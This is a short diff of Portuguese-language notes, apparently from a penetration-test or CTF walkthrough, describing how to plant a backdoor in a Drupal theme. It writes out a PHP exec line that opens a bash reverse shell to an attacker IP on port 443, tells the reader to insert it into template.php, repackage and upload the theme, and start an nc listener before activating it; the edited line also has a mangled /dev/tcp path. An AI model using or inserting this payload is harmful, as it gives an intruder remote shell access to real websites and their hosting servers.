@@ -66,11 +66,11 @@ No Drupal vimos a possibilidade de fazer instalação de um theme uppando ele at
 vai direto no site do drupal baxe o theme que esta no formato php, insira dendtro do template.php o scrip malicioso/backdoor;
 
 add essa linha de scrip no inicio do php 
-exec("/bin/bash -c 'bash -i >& /dev/tcp/ip-maq-ataque/443 0>&1'");
+exec("/bin/bash -c 'bash -i >& dev/tcp/10.10.10.7/443 0>&1'");
 Salve o arquivo e compacteo novamente.
 faça o upload e instalação do thema no drupal, não mude de thema antes de ativar o nc.
 
-nc -nvlp 443 
+nc -nlvp 443 
 ative o adminstratio theme na qual foi colocado o backdoor.
 
 
